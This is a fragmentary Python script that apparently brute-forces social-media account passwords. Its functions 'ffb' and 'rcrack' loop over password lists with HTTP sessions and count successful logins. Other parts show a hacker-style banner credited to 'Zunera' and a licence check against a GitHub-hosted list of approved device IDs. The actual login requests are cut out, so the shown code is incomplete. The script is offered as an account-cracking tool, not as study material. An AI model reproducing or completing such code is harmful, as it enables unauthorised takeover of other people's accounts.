...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [Zuniii %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
...
def rcrack(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [Zuniii %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/Zunera20/Test-8/blob/main/Z.txt').text
...
╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
\033[1;92m--------------------------------------------------
{+}\033[1;32mCREATED BY     : \033[1;32mZunera🖕??Z\033[1;32m
...
==================================================
 \33[37;41m\t IF YOU ARE FREE USER THEN GO TO Zuniii\33[0;m
\033[1;93m=================================================
...
==================================================   """)
  ...
  try:
    httpCaht = requests.get("https://github.com/Zunera20/Test-8/blob/main/Z.txt").text
    if id in httpCaht:
